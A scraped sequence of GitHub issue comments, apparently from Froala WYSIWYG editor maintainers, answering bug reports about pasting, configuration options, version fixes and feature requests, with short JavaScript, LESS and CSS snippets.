float: left;\n}. We keep it in DOM in order to be used by other editors. When the last editor instance is destroyed, the Quick Insert helper would be removed as well. This is happening in order to improve the editor performance. What we'd recommend is to destroy all the editor instances from a page when you navigate away of it.. What we'd recommend is to destroy all the editor instances from a page before changing the route and navigating to another page using manual controls: https://github.com/froala/angular-froala#manual-instantiation.. @FWennerdahl do you think you could make a Plunker / jsFiddle?. @btmdave could you please confirm you are seeing this problem on our website too?. @btmdave any input here? Thank you.. Are you setting the scrollableContainer option? Here is a basic jsFiddle which you could use to show us the problem. Thanks in advance.. Thanks for the details. . @btmdave we've just checked this again in order to fix it. It looks the CodePen was outdated (version 2.6.0). Please find here an updated code pen: https://codepen.io/anon/pen/mXoYWe.. @rajchetan please make sure you're using the latest 2.7.5 version.. @pawansingh-snapwiz the CodePen you sent is using the 2.6.0 version instead of 2.7.5.. @pawansingh-snapwiz in the code pen you sent, you are overriding the entire pasting action and skipping all the pasting internals. In the paste.beforeCleanup, you get the raw HTML which is there on the clipboard. Then, inside the pasting action, we're doing some processing which cleans the unnecessary HTML.. To get the HTML correctly, you should not override the HTML which is cleaned. As I said in the comment above, the paste.beforeCleanup is designed to return exactly the HTML from the clipboard handled by the browser.. Currently, the fix is available only here on Github and will be included in the release 2.7.6.. @davehearne when switching from Code View back to the editor, the HTML is written again back to the editor. If you want to have the autoplay only in the output, I would recommend not adding it to the original HTML, but process it just before displaying it and adding the attribute there.. @hassannaseem Microsoft is doing by itself a cleanup when pasting from Word and we cannot get the HTML as it comes from Word. Unfortunately, we cannot do nothing for that at this moment. . @StanislavMayorov there are couple of things which should be done for that. Please reach us via our website for the tech support in the Professional/Business license.. @Chandrika-Desai when using the imageOutputSize option, the width of the image would be exactly the width you're seeing while editing inside the editor. We consider this as being the correct behaviour.. @pawansingh-snapwiz please make sure you're using the latest 2.7.5 version. There this shouldn't happen.. @brandon-runbiz you should return false to prevent the default action.. That's because you are using the wrong event: https://jsfiddle.net/wc5c3jhk/45/.. https://www.froala.com/wysiwyg-editor/docs/options#paragraphMultipleStyles :). What we'd recommend for that would be to create a custom class in CSS for this and apply the class using the format.apply method.. The editor is designed to wrap by default all the content inside the editor in P tags. If you want to disable this behaviour, then please use the enter option: https://jsfiddle.net/wc5c3jhk/9/.. @chrisdeeming it will take a little bit more to test this as on XCode 8, iOS 7 is no longer supported.. According to the Browser Usage stats (https://caniuse.com/usage-table), there are very few users currently using iOS 7, therefore we decided to remove the support for it.. Thanks for the info, Chris. We haven't changed the Android version now, it was changed last year.. @FethiLamaici could you please make a recording?. @ALMUSA this should be fixed in version 2.8.1. Could you please check?. @markedmondson indeed, it should be fixed in 2.7.4.. The htmlAllowedEmptyTags is for tags which are empty, not for void tags. By default, we allow as VOID tags the ones from HTML5. I marked this as an enhancement in order to add an option to extend the list.. @mattbolt I believe your problem actually comes from the fact that you are not adding the custom tag to the htmlAllowedTags option.. @mattbolt please find here a working example: https://jsfiddle.net/wc5c3jhk/88/.. Thanks for the jsFiddle. It looks the problem was there only when pasting from one editor to another.. The last commit should fix it anyway :). @swiety85 should be fixed in the current Github master. Could you please give it a try?. @mthomasson please use the keepFormatOnDelete for that.. Having contenteditable=\"false\" attribute on a link should prevent showing the link-edit popup. . Something like this should do it:\n```js\n$(selector).on('froalaEditor.initialized', function (ev, editor) {\n  editor.events.on('keydown', function (e) {\n    // Get current active link.\n    var link = editor.link.get();\n// If there is one, prevent typing.\nif (link) {\n  e.preventDefault();\n  e.stopPropagation();\n\n  return false;\n}\n\n}, true);\n}).froalaEditor();\n. In HTML the tab character has no use and that's why it is being removed on purpose. . The editor is designed to always remove the TAB character all the time. It is not possible to keep it. What I would recommend instead would be in the beforeCleanup.paste to convert tabs to multiple spaces.. Looks like a duplicate of #2609.. @guipilon @Alderr should be fixed with the current Github master. Could you please give it a try and let us know your feedback? Thanks in advance.. @guipilon could you please send us a document you're pasting from?. @guipilon thanks. The last commit should fix it. Please make sure that you change the`htmlRemoveTags` and `pasteDeniedAttrs` options as well..js\nhtmlRemoveTags: ['script'],\npasteDeniedAttrs: ['style']\n``. Fixed on the current master.. @mcblum I would recommend creating a custom button inside the image popup which would open your custom image management: https://www.froala.com/wysiwyg-editor/examples/custom-image-button.. @sanna-woo this should be fixed on the current master. Could you please check?. @ncmancuso unfortunately, we cannot provide that.. @SeanKendle could you please check you're using the latest 2.7.5 version? Thanks.. We can't reproduce on our side in version 2.7.5. Do you think you could create a jsFiddle where we can reproduce it? Here is one you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @SeanKendle I understand that the other issue is in our attention. It would be good if you could test this issue with the latest version 2.7.5 and let us know how to replicate it, as we can't do it on a clean editor instance. If the issue is not present in version 2.7.5, then it's left only the other issue which will be addressed shortly.. https://jsfiddle.net/wc5c3jhk/35/. @javeriaanwer could you please let us know if you can reproduce this on our website or create a jsFiddle where we can reproduce it? Thank you.. @javeriaanwer are you seeing this on our website demo as well? https://www.froala.com/wysiwyg-editor. @altjx this is fixed and should work correctly in the latest 2.8.4 version.. Thecommands.aftermethod is designed to pass the parameters the command gets when it is being called in the editor, no additional info about what happened during that action. If you need to get the styles for the current paragraph, I would recommend using theselection.blocksmethod to get the current active paragraph and then the styles from it.. I understand your use-case and that could be achieved by using a combination ofcommands.beforewithcommands.after`. Adding to all editor actions such a custom action would result in a lot of additional code being added to the editor core which is used by very few. Thus, the size of the editor bundle would grow a lot unnecessary.. @wrporter this is made on purpose. When the iframe option is being used, the editor is reading automatically the rules that target the content inside it and inject that style in the iframe in order to keep the view as it should be. Unfortunately, when the style files are loaded from a different domain, the browsers do not allow to read them and inject this way. \nIf you don't want any styles, please use https://github.com/froala/wysiwyg-editor/issues/2527#issuecomment-369033717 as a workaround. . @slavakam do not include the Forms plugin or disable it via the pluginsEnabled feature.. Starting with version 2.7.4, it is possible to pass null to the imageDefaultAlign and imageDefaultDisplay options. Please use this as a replacement for the old way of doing it. . @chrisdeeming this appears to be fixed in version 2.7.6. We've checked in on Chrome in Windows 7, 8.1 and 10.. @belazor what OS are you using? . We've double checked it again on Browser Stack virtual machines, as well as physical devices and couldn't see it happening. Just to confirm, you're doing: (1) CTRL + B, (2) type something, (3) CTRL + B, (4) SPACE, (5) type something else.. We haven't made any changes to that. One thing you might want to check is if you have any Chrome/Windows extensions that might affect typing.. Please provide more details. Thank you.. It's because the context changes. You should do something like this:\njs\n$.each(settings.customButtons,\n            function() {\n                $.FroalaEditor.DefineIcon(this.icon, { SRC: this.src, template: this.template });\n                $.FroalaEditor.RegisterCommand(this.name,\n                    {\n                        title: this.title,\n                        icon: this.icon,\n                        focus: false,\n                        undo: false,\n                        refreshAfterCallback: false,\n                        callback:  this.callbackFunction\n                    });\n            });. No, it shouldn't call if you don't call it specifically using ().. Then you should do something like below:\n```js\n$.each(settings.customButtons,\n            function() {\n                var that = this;\n            $.FroalaEditor.DefineIcon(this.icon, { SRC: this.src, template: this.template });\n            $.FroalaEditor.RegisterCommand(this.name,\n                {\n                    title: this.title,\n                    icon: this.icon,\n                    focus: false,\n                    undo: false,\n                    refreshAfterCallback: false,\n                    callback:  function () {\n                       that.callbackFunction();\n                    }\n                });\n        });\n\n```\nPS: We're using this repo mainly for bug tracking.

Just make sure you are logged in and download from oue website.. @seb303 thanks for reporting this. The editor is designed to keep tables on plainPaste.. @seb303 could you please send us the HTML so that we can play with it?. @seb303 do you have the tabSpaces option enabled?. @seb303 could you please send us the HTML that you get in the paste.beforeCleanup event?. Because of the way the images are displayed, sometimes we cannot get this info accurate. Because of that, we decided not to add image to the lineBreakerTags option and implement a different approach. If you click above/below the image, you can get a new line there directly.. That's because, by default, the editor is designed not to delete block tag elements. If you'd like to make it deletable, it is necessary to add the fr-deletable class to it.\nhtml\n<p contenteditable=\"false\" class=\"fr-deletable\">...</p>. Thanks for the clarification, Sean. I see what you mean now.. We've checked this again and decided to leave the current implementation as it is. Removing that line would result in not being possible to add a line between those 2 non-editable lines easily.. This is how the browser selection works and we're not changing it in any way.. The editor is designed to trigger the blur event when another elements from the page are being focused. For this situation, I would recommend to use the events.disableBlur if you'd like to keep the popup active. A better approach would be to open the popup again instead of keeping it open when your modal is visible.. I know it might look a little bit hacky, however, IE forces us to do it for now.. @SeanKendle it is highly unlikely to add separate events for specific browsers.. @javeriaanwer could you please make a jsFiddle? Here is a basic example to start from: https://jsfiddle.net/froala/wc5c3jhk/.. @javeriaanwer what browser and OS are you using?. The response is a relative path, while you're accessing it as absolute. Could you please try returning an absolute path instead? {\"link\":\"/Upload/1695423b.png\"}\n. @gkilwein are you able to reproduce it on our website?. Please make sure that you're including the froala_style CSS file, not only the froala_editor one.. It looks the problem comes from the shared elements. Please use a unique id for each editor instance as a workaround: https://jsfiddle.net/vd44bqmq/11/.. The editor is using the text/rtf only for getting some rich info, not for the HTML pasted in the editor. If the content comes as an image, most likely this is how we're getting it from MSWord. \n@Vnthf could you send us the document you're pasting from? What Windows version and Word version are you using? . Thanks for the suggestion, Sean. Most likely we'll add an option instead of using a checkbox in the video popup.. This is more like a feature-request, therefore I marked it accordingly and will close it for now.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. @chrisdeeming could you please let us know where is it copied from?. We've just checked it with Windows 8.1 and Firefox Quantum on version 2.7.6 and appears to work fine -  I am attaching a screen recording for reference.  Would be happy to look into it if you are able to reproduce it with the latest version 2.7.6.\nWin 8.1 - FF Quantum.mov.zip. @highca could you please let us know what keys are you pressing on a QWERTY keyboard?.  Unfortunately, as @largeden said, this is a browser problem and can be reproduced in a simple jsFiddle: https://jsfiddle.net/ua6Ltb0r/. It looks like the browser itself has some problems when typing in table cell in IME mode.. Yes, just change the following. It's LESS code.\n```LESS\n// Screen sizes.\n@screen-xs: 480px;\n@screen-sm: 768px;\n@screen-md: 992px;\n@screen-lg: 1200px;\n@screen-xs-max: (@screen-sm - 1);\n@screen-sm-max: (@screen-md - 1);\n@screen-md-max: (@screen-lg - 1);\n@screen-lg-max: 'auto';\n.fr-visibility-helper {\n  display: none;\n  margin-left: 0px !important;\n@media (min-width: @screen-sm) {\n    margin-left: 1px !important;\n  }\n@media (min-width: @screen-md) {\n    margin-left: 2px !important;\n  }\n@media (min-width: @screen-lg) {\n    margin-left: 3px !important;\n  }\n}\n. @ncmancuso it looks the problem comes from including the Embedly JS file. In the latest version 2.7.6, it is no longer necessary to include it:html\n\n``. I've just checked and this is happening on a simple textarea as well. It is indeed an FF problem for a long time: https://bugzilla.mozilla.org/show_bug.cgi?id=46845. Unfortunately, there isn't too much we could do on our side for it as on page reload we're displaying the HTML we get from the underlying textarea.. Because of the way formvalidation.io works, it is not possible to call directly on the editor field. That's why a workaround is required, as described in https://github.com/froala/wysiwyg-editor/issues/1251#issuecomment-218478754. It looks like formvalidation.io isn't taking into consideration thethresholdproperty when therevalidateField` method is called. . @nemiq thanks for reporting this. We've just checked it again and the quote button is designed not to have a display selection as the other buttons have there because it includes 2 actions, but no state. If you'd like to display a text for the quote, we'd recommend to do it like this just before initializing the editor:\njs\n$.FE.COMMANDS.quote.displaySelection = function () {\n  return 'Quote';\n}. Duplicate of #2230.\n@molidort thanks for the request. It is on our TODO list, however, we haven't got to implement it yet.. @molidort unfortunately, we don't have an ETA for this.. We've just tried that in Browser Stack and there doesn't seem to be any problem. \n\n. Duplicate of #2648.. @vanayun could you please provide a document you're pasting from? Thank you.. Could you please make a recording as well? We're not able to reproduce this on Chrome on MacOS. \nAlso, what Excel version are you using?. That is very strange as we cannot reproduce it with the exact same versions. Are you copying using CMD + C / CMD + V?. Thanks for the additional details. Could you check if you have any plugins enabled in Chrome which might do something on the pasted clipboard?\nWe're doing our best to understand what is happening there, however, we couldn't reproduce it so far. I attached a recording of this working correctly on my side.\npasting from excel.mov.zip\n. @Vnthf @largeden @vanayun it would be great if you could check with the latest Github master.. Thanks for the details, @vartikatomaradl. It looks like the image is inserted in the Word document by an URL and that's why it doesn't appear in the editor. We'll fix it shortly.. Thanks, @largeden, your input is appreciated as always! We've decided on using a different more generic approach. Could you please check with the Github master and let us know your feedback?. @philippeBchn please use the iconsTemplate option instead. It looks we've broken some code there somehow.. @ibmalo95 re you seeing this on our website as well?. Could you please let us know what config you have when initializing the editor?. @mjniday @Xtinct do you think you could replicate it in a jsFiddle: https://jsfiddle.net/froala/wc5c3jhk/?. It's fixed on the current master.. @simoroshka we're not doing any changes on that and leave the browser to handle this case. This is how the browsers transform the property when nothing is specified as value.. Unfortunately we're facing a browser problem here and for now, this is a wontfix as when going to a new line we have to split the current one in half and this makes the browser autocomplete to break. There are some workarounds by unfocusing the editable area and focusing it again, however, we're not happy with any of them.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. It is unlikely to implement this behavior by default in the editor. Is there any reason why you think this behavior is better than the existing one?. @kantuni thanks for reporting it. Should be fixed on the current Github master. Could you please check it?. Thanks for the feature-request, @StickNitro .. I think that there is currently a confusion. The align button from the toolbar popup set the default alignment for the entire cell, while the one from the editor toolbar, sets the alignment for the current block tag inside the table cell. Therefore, if you have 2 lines in the toolbar cell, you could use the main toolbar button to align individually the lines.. @lostan it's on our roadmap: https://wysiwyg-editor-roadmap.froala.com/public/ideas/3546.. We don't have a page editing mode yet, however, it is on our feature-list.. It is on our roadmap: https://wysiwyg-editor-roadmap.froala.com/public/ideas/5916. @bilalahmad4554 do you think you could send us a video highlighting the problem? Thank you in advance.. @seb303, unfortunately, this is a browser rendering problem and there is not too much we could do about it. The current way of inserting the non-breaking spaces is the one which works in most of the cases. . The toolbar buttons are designed to display the state of the content. To change the toolbar buttons state, the way the content is formatted should be changed. To clear the formatting, you could use the following method: https://www.froala.com/wysiwyg-editor/docs/methods#commands.clearFormatting. . We've just checked this and it looks like Chrome is not putting the correct data in the clipboard. For now, I've reported it to the Chromium Bug tracker: https://bugs.chromium.org/p/chromium/issues/detail?id=830568.. @windbug for tech support please contact us via our website. Thank you.. Thanks for the feature-request, @glebmachine .. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. We don't have such a feature built-in. You could use something like https://github.com/kpdecker/jsdiff for making a diff between different HTML outputs.. @Trapdafifou the format.toggle method is designed to work for inline tags, not for block tags such as blockquote, p, div, h1, etc.. @loutocky the editor config cannot be changed after the editor was initialized. If you would like to change it, the way to do it would be by destroying the editor instance and initializing it again. \nFor angular issues, please use the Angular repo instead. Thank you.. see https://github.com/froala/angular-froala-wysiwyg#manual-initialization. It is fixed on the current master.. That is because it is not possible to have 2 inputs on the same page with selection in it. When the colors popup is showm the cursor goes to the HEX input and we remove it from the editor.. If you'd like to keep the inline style on paste, you should change the pasteAllowedAttrs option and remove the style from the array.\n. @nevendyulgerov when using the approach you described, which is the one we recommend, the cursor remains at the correct position. I've made a jsFIddle to illustrate it, maybe I am missing something: https://jsfiddle.net/wc5c3jhk/237/.. The problem of the jumping cursor is most likely coming from setting the HTML back to the editor while typing in it. I believe that in your implementation, you are getting the edited HTML and then in React you set it back to the editor somehow. When the cursor is inside the editable area we do not recommend to put new HTML in there because that would make the editor loose cursor position and scroll because the selection info is reset. . All tags which have HTML inside them are treated as inline tags and they are being split on the ENTER action. If you'd like to implement a custom behavior for this case, you'd have to intercept the keydown event and change the way enter is handled in this case. . We just put an update for it on the website. . @karanjariwala https://www.froala.com/wysiwyg-editor/examples/drop-content. Sure, you could make a custom icon template for that: https://www.froala.com/wysiwyg-editor/docs/concepts/custom/icon.. Could you make a screenshot of the request in the developer tools console?\n\nOn 3 Apr 2018, at 12:56, Ji-Yeon Choi notifications@github.com wrote:\nExpected behavior.\nSteps to reproduce the problem.\nUpload an image file from the Chrome.\nos_x_yosemite_2-wallpaper-1366x768.jpg\nOS.\nWindows 10 pro\nfroala editor:Latest commit version.\nBrowser.\nChrome\n(FF, IE10 has no problem)\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub, or mute the thread.\n.

It's fixed on the current master and will be included in the next minor release.. Thanks for the feature-request, @dloreto. . @dloreto we marked it as a feature-request and closed it. We keep this repo only for bug tracking, not for feature requests. We might add it, however, I cannot provide an ETA.. @TwentyOverTen when displaying the code view, based on the plugins that you might be using, Code Beautifier / Code Mirror, there might be a couple of indentation changes. Also, the editor is designed to make some changes in order to assure the best editing. Unfortunately, in the current version V2, we won't make any changes to that.. The editor is wrapping each new line in P tags. By default, it has a margin-bottom of 10px. You could override it with the following CSS:\n\ncss\n.fr-view p {\n    margin-bottom: 0px !important;\n}. Please see https://www.froala.com/wysiwyg-editor/docs/events#commands.before.. With the latest commit, you can just add the following 2 settings:\njs\ntableResizer: true,\ntableDefaultWidth: null. We use this repo mainly for bug tracking. While the editor is paid, you can download it for free and take for a spin before purchasing the license so that you can make sure it works for your needs.\nThe SDKs and framework integration plugins are licensed under MIT / BSD. These licenses apply only for the code of the integrations, not the editor itself.. The framework plugins are under the MIT/BSD license, not the editor itself: https://github.com/froala/angular-froala-wysiwyg, https://github.com/froala/react-froala-wysiwyg, etc.. @fynnfeldpausch the icon templates are treated as HTML, they are not compiled in anyway.. Unfortunately, it's unlikely for us to add it as the editor is designed not to be framework-dependent.. @andymason could you please check if you still have this problem in version 2.8.0?. @andymason we've put a fix and the editor should work fine with version 2.8.1. It would be great if you could confirm that the problem is still there. Thanks in advance.. It's fixed on the current master.. It's fixed on the current master.. It's fixed on the current master already.. Make sure you enable the following option when using the editor for sending emails: https://www.froala.com/blog/wysiwyg-editor/styling-emails-with-wysiwyg-html-editors.. @vartikatomaradl it would be great if you could let us know what problems you get. The Github master version is the one which is used for dev between version releases and it indeed might contain few issues.. We cannot provide a release date at this moment. Could you send us the options you're initializing the editor with?. @vartikatomaradl we've checked this and doesn't appear to be a problem that we could reproduce with the basic editor config. It would be great if you could put these changes on a staging app and send us a link to it via our contact form: https://www.froala.com/wysiwyg-editor/contact. Thanks in advance.. @bonesoul please make sure that you're using the editor version 2.7.6. . https://www.froala.com/wysiwyg-editor/examples/font-awesome-5-js :). If you don't want to use the JS way, you could include the CSS for FA5 and simply change the template option: iconsTemplate: 'font_awesome_5s'. We're not planning on replacing by default the Font Awesome 4.4 with 5 because the free icons which come with FA5 are not looking so good and many of our users are not looking to buy a Font Awesome license. \nA glimpse into the future, we're planning on removing the Font Awesome dependency all together and add some custom built icons. . The latest commit adds the fontSizeUnit option which could be set as 'pt' to use points instead of pixels.. Got further details via email. To replicate it, select and copy/paste content from https://en.wikipedia.org/wiki/Froala_Editor.\n\n. Adding a new line after the image would create some HTML which wasn't introduced by the end user. For such case we have implemented 2 things: (1) the line breaker tool and (2) when you click closer to the image above/below a new line would be introduced.. @javeriaanwer what browser and OS are you using?. It can be done like this: https://github.com/froala/wysiwyg-editor/issues/1235#issuecomment-251943999. However, we do not recommend to disable sanitization because you might introduce XSS problems.. For now only pt and px can be fully used.. For that we'd recommend to use the inline toolbar with minor customizations: https://www.froala.com/wysiwyg-editor/inline.. @abologna-r7 Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @abologna-r7 to keep the HTML, HEAD and BODY tags it would be necessary to enable the fullPage option. Even if you added them in the htmlAllowedTags, they are being removed because of the fact that on the same page there can't be multiple HTML HEAD and BODY tags. The full-page option sets the editor in a special state which is designed to handle the content in such a way so that these tags are kept as well.. It looks this is not reproducible on the latest editor version or I am missing something. Could you please check with https://jsfiddle.net/wc5c3jhk/362/?. You could inject them like this:\n``js\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  editor.$head.append(your_defs);\n}).froalaEditor();. @codeabit at this moment we're facing some limitations on copying just a part of the table when you select the cells. This is awontfixfor the current major version V2 and will be addressed in the next version most likely.. I would recommend creating a custom button in the toolbar (https://www.froala.com/wysiwyg-editor/examples/custom-buttons) and then open a modal. When the OK button is hit, insert the content in the editor by using thehtml.insertmethod.. It's fixed on the current master.. Thanks for the feature-request, @DenniLa2. We keep this repo mainly for bug tracking, therefore I am closing this for now.. @SeanKendle Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @lfeistner please reach the Wiris team for more details. They have done the Wiris integration.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @angelvazquezmenendez87 would it be possible to send the GIF again, it's not visible. Also, do you have any details about where you're pasting the HTML from?. @dbakshi in order to use the editor, you would have to purchase a license: https://www.froala.com/wysiwyg-editor/pricing.. I've just checked it and looks like the image is being inserted correctly in Firefox on my side. It looks like your browser is reading the file a little bit slow. The upload works like this: the file is read from disk and rendered in the editor to display the placeholder, in the same time the upload already uploads the image. My guess is that in your case the image is not read from disk to be displayed in the editor fast enough or you might have some configurations in FF which prevent that from happening.. Thanks for sharing the solution, @cauethenorio .. @abologna-r7 Could you make a jsFiddle for it? Thank you in advance.. Unfortunately, we don't have such an option at this moment. It's already on our list, however, I cannot provide an ETA for it now.. Thanks for the suggestion guys. We're going to put an update here in the following days.. @mthomasson, until we add such a feature, we'd recommend using thecommands.after` event to find out when a new column / row was added.. Although, this is the way Google Docs or MSWord work, indenting the whole list would result in an invalid HTML because in HTML5, for UL and OL tags, valid children are only LI tags.  Unfortunately, in order to keep this HTML5 valid, we would have to keep the current implementation.. Duplicate of #2725. @Wolf21 are you getting this problem on our website? Could you please send us the video file that you''re using?. Closing this due to lack of response.. Duplicate of https://github.com/froala/wysiwyg-editor/issues/2725. When scrolling, the editor is designed to hide all dropdowns in order to be able to see the new content on the screen. . It's fixed in 2.8.4.. Could any of you guys send us a link / file from which we can paste to see this problem?. Thanks for the clarification @Lyubomyr. @coolrecep looking forward to getting details from your side as well. . @GMiLL5 do you think you could make a recording? Thanks in advance.. When the colors popup is opened, the cursor focuses on the input inside the popup. The browsers do not allow to have focus on multiple regions on the same page and that is why the focus / highlight is being removed from the editor.. @TimSielemann we're not able to reproduce it. Do you think you could provide a video?. See https://www.froala.com/wysiwyg-editor/docs/options#linkAutoPrefix.. @largeden could you please confirm if you're able to reproduce this? Thanks in advance!. I just checked this and works fine on my side with the current master repo. @largeden do you think you could give it a try? Thanks in advance.. This should be fixed on the current master repo from here.. Unfortunately, this is browser rendering issue for the cursor and there is not too much we could do about it.. @dharmadurai could you please provide more details about where you're pasting from? . @dharmadurai my mistake. Sorry. Waiting for more details. Thanks.. @kantuni are you experiencing this on our website as well?. That is good to hear, @kantuni :). That is because in FF and Edge, we're using the default browser behavior for sticky elements (position: sticky from CSS). Is this creating any problems?. This should be fixed in version 2.8.4.. Thanks for the feature-request, @coolrecep .. @Hillcow could you please let us know what output you get in the console when you add the following events:\njs\n.on('froalaEditor.image.error', function (e, editor, error, response) {\n  console.log(error);\n  console.log(response);\n});. Closing this due to lack of response.. Unfortunately, on iOS it is not possible to focus to an element by using JS code. It requires user interaction. This is a restriction set in by Apple.. You should use the raw helper when displaying the content: https://apidock.com/rails/ActionView/Helpers/RawOutputHelper/raw.. At this moment the videoDefaultWidth is available only for inserting videos, not the embeds. It will be available for embeds after adding responsive videos - see #2644.. Thanks for the details @wojcikstefan. Any way we could get the HTML which is there in the editor when this error happens?. @philfreo it is pretty clear where the email comes from, however, it is strange that you're seeing it in Chrome because that part of the code is only for Safari.. @philfreo have you had the chance to take a look over the changes I put recently?. I would assume this is fixed as per our tests the problem is not there anymore.. Closing this for now, as we keep here only the issues, not feature-requests. Thanks for sending it, @iseem!. @mbensch no update yet. The fix will be included in the next minor release, however, I don't have an ETA to share for it at this moment.. Should be fixed on the current master branch.. Thanks for the feature-request, @dgroh .. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. Please make sure that you've removed style from the following option: https://www.froala.com/wysiwyg-editor/docs/options#htmlRemoveTags.. As far as we're aware, it is not possible to avoid that. We'd recommend to set a custom random filename on the server side.. In the case of an image, you'd have to store the selected image by using the image.get method and then restore it back by using the image.insert one. If you could make a jsFiddle we could help more with this.. @SeanKendle it wouldn't really help to get the login details to your platform as we cannot check the code and make changes on it. It would be good if you could isolate just the editor and the file manager in a jsFiddle.. We'd recommend enabling the iframe mode in this case: https://jsfiddle.net/5wckfzn5/3/.. Closing this in favor of https://github.com/froala/wysiwyg-editor/pull/2938.. Thanks for the input @yenshih. We don't have anyone speaking Chinese, therefore it is hard for us to decide which of the translations should go there. As per our evaluation, this PR had far more comments than the others and that is why we've chosen that one in favor of this. Do you think you could put together a PR with all the changes discussed herein reviews? That would help a lot. . Thanks for the clarification, @Justineo . If you guys could put together a new PR incorporating all the suggestions that would be amazing. . I would be happy, however, it doesn't look any of the suggested changes were added in a new commit by @otakustay.. @otakustay Thanks a million!!. Thanks @otakustay. Would you consider #2938 ready to be merged now?. @YannLeBihan could you please send us the document you're pasting from?. The last commit is fixing the 2nd problem. Unfortunately, for the first one, there is not too much we could do because of the fact that we get the HTML without that space from Microsoft Word.. Should be fixed on the current Github master.. @Kikerrobles do you think you could make a jsFiddle? We've checked it and couldn't replicate on our side.. All looks good on the demo from the Froala Website. Closing this for now, but we'd be happy to look again into it if we get more details. . The table might come with align attributes instead of the alignment in the CSS style. We'll have to make some more checks.. Closing this as it is related to tech support. We use this repo mainly for bug tracking.. @fynnfeldpausch we've just checked this and there doesn't appear to be any problem in Firefox 59.0.2 (it might have been something from FF side which was fixed). Would it be possible to check in it as well?. @jkeatingatigloo the image plugin is designed for interacting with the images, not for allowing/preventing pasting images. To disable adding images in the editor, it would be best to use the pasteDeniedTags option.. https://wysiwyg-editor.froala.help/hc/en-us/articles/115000817105-How-can-I-set-a-default-font-style-. We don't have such an option. I marked this as a feature-request and in case there would be more requests, we might add it in the editor.. We use this repo only for bug tracking and we do not keep feature-requests opened here. The editor is designed that when there is a paragraph being used and enter is hit at the end of the paragraph, it would keep the format that is used in the new paragraph because that is the way most of the web/desktop apps work. \nWhile from your point this might be a bug, we do not consider it like so as it was designed to work like this on purpose.. We don't have a built-in option for such a behavior and it is unlikely to add one because of the way the selection in the browser works.. @tokarkry you could easily disable it via https://www.froala.com/wysiwyg-editor/docs/options#shortcutsEnabled.. You cannot have the editor itself set as the scrolalbleContainer. You could put there a parent which is scrollable: https://jsfiddle.net/ppyLhnqt/12/.. Thanks for the feature-request, @psoloninka. . The back button is a regular button that we have in place for each of the popup. You could add one at anytime, by using a custom button: https://www.froala.com/wysiwyg-editor/examples/custom-buttons.. The htmlAllowedEmptyTags option is designed to be set only for non-block tag elements. Therefore, if you add the p tag there it won't work correctly anymore. I am sure that there is another better way of achieving the things you're looking for. Could you please explain your use-case?. @apiram most likely you've changed the wordAllowedStyleProps (https://www.froala.com/wysiwyg-editor/docs/options#wordAllowedStyleProps) and allowed text-indent. Although it might be present, we'd recommend not using this option.. This is the way the accesibility was designed to work and unfortunately because of some browser limitations for editing we have to keep it like this. . @templatetuners could you please check that you're using the latest 2.8.1 version?. @templatetuners we were not able to reproduce it. Could you please let us know more details on what mobile device are you able to reproduce this?. What is the specific device that you're testing on?. @templatetuners we've tried to reproduce this without success. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. The focus can be moved over to the toolbar only by using the ALT+F10 combination. . Duplicate of #2785. When you insert HTML, the stored selection is removed because selection is set in the html.insert method. If you'd like to keep the selection, we'd recommend searching for markers after storing the selection and change their class name (this.el.querySelectorAll('.fr-marker')) and then change the class back after the insert and restore the selection.. I think this might have been fixed in the version 2.8.4. I am not able to reproduce it on the current website version. Do you think you could check? . Closing this due to lack of response.. It is happening only when you have the SpellCheker included. We'll address this shortly.. When using list items, the indentation is not possible for the first list item, in order to keep it HTML 5 valid. . Thanks for the suggestion, @Kapranov98. As a workaround until we add this, I would recommend to use the contentChanged event and store the editor content in the localstorage.. This is the way MS Edge displays the misspelled words which are strike-through. Unfortunately, there is nothing we could do to change this.. Thanks for the feature-request @salasfoor . Thanks for the feature-request @talha-asad. CMD + OPT + SHIFT + V already works on MacOS.. see https://www.froala.com/wysiwyg-editor/docs/options#entities. The zIndex is being applied in order to make sure that it stays on top of everything else on the page. Also, the toolbar is designed to work highly in connection with the rest of the editor UX. . @jkeatingatigloo thanks for the suggestion. Unfortunately, at this moment adding translations for those options is not on our list because they can be customized and usually are customized by users.. Duplicate of #2826. @philfreo it is related to the SCAYT integration that we provide. We'll put an update shortly for fixing this.. @antmoreau not sure I understand the issue. Do you think you could send us a recording? Thanks in advance.. Unfortunately, in some Chrome versions we're facing this problem and for now we don't have a possible workaround.. @SeanKendle it is quite a particular case. What I would recommend is to use the link.beforeInsert method and make changes to the options there in case certain conditions are met. Inside the link.beforeInsert method, you could update the linkAutoPrefix option like this:\njs\neditor.opts.linkAutoPrefix = false;. I am marking it as a feature-request for now. The image insertion flow is different than the link one, so we'll have to discuss a little bit about that.. Duplicate of #2801 . On undo, the editor is designed to update the editor contents and cursor position as it was when the state was saved.. This should be fixed on the current master branch.. All options that start with image are working only when the Image plugin is included.. Shoud be fixed on the current master repo.. We don't keep feature requests opened here, therefore, I am marking it accordingly and closing this for now. Thanks for the suggestion!. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. Thanks for the feature-request 